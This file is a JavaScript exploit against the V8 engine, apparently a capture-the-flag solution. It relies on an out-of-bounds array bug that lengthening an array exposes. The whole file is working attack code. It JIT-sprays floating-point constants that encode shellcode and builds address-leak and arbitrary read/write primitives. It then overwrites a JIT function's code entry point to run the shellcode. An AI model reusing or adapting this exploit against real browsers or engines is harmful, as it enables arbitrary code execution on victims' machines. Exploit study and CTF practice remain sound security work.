let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

function jit() {
    return [
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112871410787e-246, // itof(0xceb9050636cb866n)
        1.9711314215434657e-246, // itof(0xceb906163782fb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9616425752617766e-246, // itof(0xceb6e69622f0548n)
        1.9711832695973408e-246, // itof(0xceb9090e7894850n)
        1.971182900582351e-246, // itof(0xceb909090f63148n)
        1.9711831018987653e-246, // itof(0xceb9090c0314890n)
        1.971112653196158e-246, // itof(0xceb9050303ab866n)
        1.9710920957760286e-246, // itof(0xceb903d59414cb8n)
        1.9710610293119303e-246, // itof(0xceb9020e0c14890n)
        1.9532382542574046e-246, // itof(0xceb505349440548n)
        1.971183239760578e-246, // itof(0xceb9090e0894850n)
        1.9711128050518315e-246, // itof(0xceb905053db3148n)
        1.971182900255075e-246, // itof(0xceb909090e28948n)
        1.9710902863710406e-246, // itof(0xceb903bb0c03148n)
        -6.828527034370483e-229 // itof(0x909090909090050fn)
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization

let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// get v8 base
let v8_base = ftoi(oob_arr[22]) & 0xffffffff00000000n;
console.log(`[+] v8_base == ${hex(v8_base)}`);

// arbitrary address read/write
function aarw(addr, value = null) {
    oob_arr[22] = itof(addr); // external_pointer of |typed_arr|
    oob_arr[23] = itof(0n); // base_pointer of |typed_arr|
    if (value == null) {
        // if |value| is null, read 8 bytes from |addr|
        return typed_arr[0];
    } else {
        // if |value| isn't null, write |value| to |addr|
        typed_arr[0] = value;
    }
}

let jit_addr = v8_base + addrof(jit); // address of |jit()|
console.log(`[+] jit_addr == ${hex(jit_addr)}`);
let code_addr = v8_base + (aarw(jit_addr - 1n + 0x18n) & 0xffffffffn); // address of CodeDataContainer of |jit()|
console.log(`[+] code_addr == ${hex(code_addr)}`)
let entrypoint_addr = aarw(code_addr - 1n + 0x10n); // address of code_entry_point of |jit()|
console.log(`[+] entrypoint_addr == ${hex(entrypoint_addr)}`);

// overwrite code_entry_point of |jit()| with address of shellcode
// aarw(code_addr - 1n + 0x10n, entrypoint_addr + 0x7en); // debug
aarw(code_addr - 1n + 0x10n, entrypoint_addr + 0x67n); // release

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
